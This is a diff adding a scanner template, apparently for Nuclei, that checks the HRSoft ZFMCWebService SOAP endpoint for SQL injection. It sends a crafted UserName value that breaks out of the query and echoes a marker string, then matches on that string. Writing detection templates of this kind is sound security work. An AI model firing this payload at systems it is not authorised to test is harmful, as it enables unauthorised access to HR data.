@@ -1,0 +1,40 @@
+id: HRSoft-ZFMCWebService-sqlInjection
+
+info:
+  name: HRSoft ZFMCWebService SQL Injection
+  author: iSee857
+  severity: high
+  description: |
+    This template detects a SQL injection vulnerability in HRSoft ZFMCWebService SOAP endpoint.
+  tags: sql-injection, soap, hrsoft
+
+http:
+  - raw:
+      - |
+        POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8" ?>
+        <soap:Envelope
+          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+          xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+          xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+        >
+         <soap:Body>
+          <UserInfo xmlns="http://tempuri.org/">
+           <UserName>') AND 1004 IN (SELECT (SELECT CASE WHEN 1004=1004 THEN 'sxsdvddqwe' ELSE 'sxsdvddqwe' END))-- OOxB</UserName>
+           <DeptName>rt</DeptName>
+          </UserInfo>
+         </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "sxsdvddqwe"
+
+      - type: status
+        status:
+          - 200
